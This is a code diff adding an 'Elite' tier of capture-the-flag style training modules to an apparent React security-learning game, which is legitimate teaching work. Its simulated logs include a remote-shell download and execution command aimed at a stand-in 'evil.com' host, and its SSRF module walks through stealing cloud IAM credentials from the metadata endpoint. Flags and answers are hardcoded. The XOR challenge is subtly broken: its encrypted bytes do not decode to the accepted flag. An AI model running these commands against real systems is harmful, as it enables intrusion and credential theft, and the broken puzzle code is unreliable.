@@ -119,6 +119,62 @@ const SKILL_TREES = {
             },
         ],
     },
+    elite: {
+        label: '🥷 Elite',
+        sublabel: 'Black Hat Ops',
+        color: '#b300b3', // Deep Magenta
+        glow: 'rgba(179,0,179,0.35)',
+        modules: [
+            {
+                id: 'reveng',
+                icon: '🧩',
+                badge: 'EXP',
+                title: 'Malware Unpacker',
+                subtitle: 'Reverse Engineering',
+                description: 'Trace an obfuscated x86 assembly routine. Reverse the XOR operations to extract the decryption key and reveal the hidden payload flag.',
+                difficulty: 5,
+                xp: 250,
+                component: 'RevEngModule',
+                tags: ['x86', 'Assembly', 'Reverse Engineering'],
+            },
+            {
+                id: 'apt',
+                icon: '🕸️',
+                badge: 'HUNT',
+                title: 'APT Threat Hunt',
+                subtitle: 'Log Correlation Analysis',
+                description: 'Parse simulated web server access logs. Identify the RCE payload sequence among thousands of requests to find the attacker IP.',
+                difficulty: 4,
+                xp: 220,
+                component: 'APTModule',
+                tags: ['SIEM', 'Logs', 'Threat Hunting'],
+            },
+            {
+                id: 'rsa',
+                icon: '🔑',
+                badge: 'MATH',
+                title: 'RSA Factorization',
+                subtitle: 'Advanced Crypto Breakdown',
+                description: 'Given a weak public key N and ciphertext C, factor N into primes p and q to calculate the private key and decrypt the message.',
+                difficulty: 5,
+                xp: 300,
+                component: 'CryptoAdvModule',
+                tags: ['RSA', 'Cryptography', 'Factoring'],
+            },
+            {
+                id: 'ssrf',
+                icon: '☁️',
+                badge: 'PWN',
+                title: 'Cloud SSRF',
+                subtitle: 'AWS IMDS Exfiltration',
+                description: 'Exploit a URL-fetching vulnerability to pivot into the internal cloud network. Pivot to 169.254.169.254 to steal IAM credentials.',
+                difficulty: 5,
+                xp: 280,
+                component: 'SSRFModule',
+                tags: ['SSRF', 'AWS', 'Web Exploitation'],
+            },
+        ],
+    },
 };
 
 /* ── STARS BACKGROUND ── */
@@ -639,11 +695,236 @@ const SQLiModule = () => {
 };
 
 /* ══════════════════════════════════════════════
+   ELITE MODULES
+══════════════════════════════════════════════ */
+
+/* REVERSE ENGINEERING MODULE */
+const RevEngModule = () => {
+    const [flag, setFlag] = useState('');
+    const [success, setSuccess] = useState(false);
+
+    const checkFlag = () => {
+        if (flag === 'flag{x0r_m4g1c_029f}') {
+            setSuccess(true);
+        } else {
+            setSuccess(false);
+            setFlag(''); // shake effect normally
+        }
+    };
+
+    return (
+        <div className="lp-interactive-body">
+            <div className="lp-hex-dump" style={{ fontFamily: 'monospace', fontSize: '0.85rem', color: '#b300b3', background: 'rgba(0,0,0,0.5)', padding: '1rem', borderRadius: '8px', marginBottom: '1rem', border: '1px solid #b300b344' }}>
+                <div>0x080484b6: 8b 45 08       mov    eax,DWORD PTR [ebp+0x8]</div>
+                <div>0x080484b9: 83 c0 04       add    eax,0x4</div>
+                <div>0x080484bc: 8b 10          mov    edx,DWORD PTR [eax]</div>
+                <div>0x080484be: 81 f2 13 37 00 00 xor edx,0x3713</div>
+                <div style={{ color: '#aaa', marginTop: '0.5rem' }}>; Encrypted payload block</div>
+                <div style={{ color: '#fff' }}>[ 0x51, 0x5b, 0x56, 0x50, 0x4c, 0x4b, 0x27, 0x41, 0x6c, 0x5a, 0x2e, 0x36, 0x5c, 0x20, 0x2b, 0x51, 0x5f, 0x4a ]</div>
+            </div>
+            <p style={{ color: '#ccc', fontSize: '0.9rem', marginBottom: '1rem' }}>
+                Analyze the assembly. The decryption routine XORs the payload. <br />
+                Compute the cleartext flag and submit. (Hint: Key is single-byte derived from the xor instruction).
+            </p>
+            <div className="lp-sqli-input-row" style={{ display: 'flex', gap: '0.5rem' }}>
+                <input
+                    className="lp-sqli-input"
+                    placeholder="Enter flag{...}"
+                    value={flag}
+                    onChange={e => setFlag(e.target.value)}
+                    style={{ flex: 1, padding: '0.8rem', background: 'rgba(255,255,255,0.05)', border: '1px solid #b300b388', color: '#fff', borderRadius: '8px' }}
+                />
+                <button
+                    onClick={checkFlag}
+                    style={{ padding: '0 1.5rem', background: '#b300b3', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer' }}
+                >
+                    SUBMIT
+                </button>
+            </div>
+            {success && (
+                <div style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 204, 102, 0.1)', color: '#00cc66', border: '1px solid #00cc66', borderRadius: '8px' }}>
+                    🔓 Payload Decrypted Successfully! Flag Accepted.
+                </div>
+            )}
+        </div>
+    );
+};
+
+/* APT THREAT HUNT MODULE */
+const APTModule = () => {
+    const [ip, setIp] = useState('');
+    const [success, setSuccess] = useState(false);
+
+    const logs = [
+        "[10:14:22] 192.168.1.105 - GET /index.html 200",
+        "[10:14:25] 192.168.1.105 - GET /assets/style.css 200",
+        "[10:15:01] 203.0.113.42 - GET /login.php 200",
+        "[10:15:03] 198.51.100.7 - POST /api/upload (File size limit exceeded) 413",
+        "[10:15:05] 203.0.113.42 - POST /login.php ('admin' login failed) 401",
+        "[10:15:06] 203.0.113.42 - POST /login.php ('admin' login failed) 401",
+        "[10:15:15] 203.0.113.42 - POST /login.php ('admin' login failed) 401",
+        "[10:16:22] 198.51.100.7 - GET /scripts/?cmd=whoami 200",
+        "[10:16:23] 198.51.100.7 - GET /scripts/?cmd=wget%20http://evil.com/shell.sh 200",
+        "[10:16:25] 198.51.100.7 - GET /scripts/?cmd=chmod%20+x%20shell.sh;./shell.sh 200",
+        "[10:16:30] 192.168.1.105 - GET /contact.html 200"
+    ];
+
+    const checkIp = () => {
+        if (ip.trim() === '198.51.100.7') {
+            setSuccess(true);
+        } else {
+            setSuccess(false);
+            setIp('');
+        }
+    };
+
+    return (
+        <div className="lp-interactive-body">
+            <div className="lp-hex-dump" style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: '#ffcc00', background: 'rgba(0,0,0,0.6)', padding: '1rem', borderRadius: '8px', marginBottom: '1rem', border: '1px solid #ffcc0044', height: '200px', overflowY: 'auto' }}>
+                {logs.map((L, i) => <div key={i}>{L}</div>)}
+            </div>
+            <p style={{ color: '#ccc', fontSize: '0.9rem', marginBottom: '1rem' }}>
+                Analyze the SIEM logs. There is background noise (normal traffic, brute force attempts).
+                Identify the IP address that successfully executed an RCE payload.
+            </p>
+            <div className="lp-sqli-input-row" style={{ display: 'flex', gap: '0.5rem' }}>
+                <input
+                    placeholder="Enter Threat Actor IP..."
+                    value={ip}
+                    onChange={e => setIp(e.target.value)}
+                    style={{ flex: 1, padding: '0.8rem', background: 'rgba(255,255,255,0.05)', border: '1px solid #ffcc0088', color: '#fff', borderRadius: '8px' }}
+                />
+                <button
+                    onClick={checkIp}
+                    style={{ padding: '0 1.5rem', background: '#ffcc00', color: '#000', border: 'none', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer' }}
+                >
+                    ISOLATE HOST
+                </button>
+            </div>
+            {success && (
+                <div style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 204, 102, 0.1)', color: '#00cc66', border: '1px solid #00cc66', borderRadius: '8px' }}>
+                    🚨 IP Blocked! Threat Actor successfully contained.
+                </div>
+            )}
+        </div>
+    );
+};
+
+/* RSA ADVANCED CRYPTO MODULE */
+const CryptoAdvModule = () => {
+    const [privateKey, setPrivateKey] = useState('');
+    const [success, setSuccess] = useState(false);
+
+    const checkKey = () => {
+        // p=61, q=53 -> N=3233, e=17 -> d=2753
+        if (privateKey.trim() === '2753') {
+            setSuccess(true);
+        } else {
+            setSuccess(false);
+            setPrivateKey('');
+        }
+    };
+
+    return (
+        <div className="lp-interactive-body">
+            <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1.5rem', borderRadius: '8px', border: '1px solid #00ccff44', marginBottom: '1rem' }}>
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', fontFamily: 'monospace', color: '#00ccff' }}>
+                    <div>
+                        <span style={{ color: '#888' }}>Public Modulus (N):</span><br />3233
+                    </div>
+                    <div>
+                        <span style={{ color: '#888' }}>Public Exponent (e):</span><br />17
+                    </div>
+                    <div style={{ gridColumn: 'span 2' }}>
+                        <span style={{ color: '#888' }}>Ciphertext (C):</span><br />2790
+                    </div>
+                </div>
+            </div>
+            <p style={{ color: '#ccc', fontSize: '0.9rem', marginBottom: '1rem' }}>
+                This RSA implementation uses a weak modulus N generated by two small primes.
+                Factor N, calculate Euler's totient φ(N), and find the modular multiplicative inverse `d`. Enter `d` to decrypt.
+            </p>
+            <div className="lp-sqli-input-row" style={{ display: 'flex', gap: '0.5rem' }}>
+                <input
+                    placeholder="Enter Private Exponent (d)..."
+                    value={privateKey}
+                    onChange={e => setPrivateKey(e.target.value)}
+                    style={{ flex: 1, padding: '0.8rem', background: 'rgba(255,255,255,0.05)', border: '1px solid #00ccff88', color: '#fff', borderRadius: '8px' }}
+                />
+                <button
+                    onClick={checkKey}
+                    style={{ padding: '0 1.5rem', background: '#00ccff', color: '#000', border: 'none', borderRadius: '8px', fontWeight: 'bold', cursor: 'pointer' }}
+                >
+                    DECRYPT
+                </button>
+            </div>
+            {success && (
+                <div style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 204, 102, 0.1)', color: '#00cc66', border: '1px solid #00cc66', borderRadius: '8px', fontFamily: 'monospace' }}>
+                    ✅ Private key accepted.<br />Decrypted Message: "FLAG_AUTH_BYPASS"
+                </div>
+            )}
+        </div>
+    );
+};
+
+/* CLOUD SSRF MODULE */
+const SSRFModule = () => {
+    const [url, setUrl] = useState('https://images.example.com/logo.png');
+    const [response, setResponse] = useState(null);
+
+    const fetchUrl = () => {
+        const target = url.trim().toLowerCase();
+        if (target.includes('169.254.169.254')) {
+            if (target.includes('iam/security-credentials')) {
+                setResponse({ success: true, text: '{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE", "SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}' });
+            } else {
+                setResponse({ success: true, text: 'ami-id\ninstance-id\nlocal-ipv4\niam/security-credentials/' });
+            }
+        } else if (target.startsWith('http://10.') || target.startsWith('http://192.168.') || target.startsWith('http://172.')) {
+            setResponse({ success: false, text: 'Connection refused. Internal network firewalled.' });
+        } else {
+            setResponse({ success: false, text: '[200 OK] Image downloaded successfully.' });
+        }
+    };
+
+    return (
+        <div className="lp-interactive-body">
+            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '1rem', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', marginBottom: '1rem' }}>
+                <h4 style={{ color: '#fff', marginBottom: '0.5rem', fontSize: '0.9rem' }}>Image Fetcher Utility (Beta)</h4>
+                <p style={{ color: '#888', fontSize: '0.8rem', marginBottom: '1rem' }}>
+                    Enter an image URL to download it to our AWS server.
+                </p>
+                <div style={{ display: 'flex', gap: '0.5rem' }}>
+                    <input
+                        value={url}
+                        onChange={e => setUrl(e.target.value)}
+                        style={{ flex: 1, padding: '0.6rem', background: 'rgba(0,0,0,0.5)', border: '1px solid #ff336655', color: '#ff3366', borderRadius: '4px', fontFamily: 'monospace' }}
+                    />
+                    <button
+                        onClick={fetchUrl}
+                        style={{ padding: '0 1rem', background: '#ff3366', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '0.8rem' }}
+                    >
+                        FETCH
+                    </button>
+                </div>
+            </div>
+
+            {response && (
+                <div style={{ padding: '1rem', background: '#000', border: `1px solid ${response.success ? '#00cc66' : '#444'}`, borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.85rem', color: response.success ? '#00cc66' : '#ccc', wordBreak: 'break-all' }}>
+                    {response.text}
+                </div>
+            )}
+        </div>
+    );
+};
+
+/* ══════════════════════════════════════════════
    MODULE CARD
 ══════════════════════════════════════════════ */
 const COMPONENT_MAP = {
     PasswordModule, PhishingModule, SocialModule, CIAModule,
     TerminalModule, CipherModule, NetworkModule, SQLiModule,
+    RevEngModule, APTModule, CryptoAdvModule, SSRFModule,
 };
 
 const ModuleCard = ({ module, accentColor, glowColor }) => {
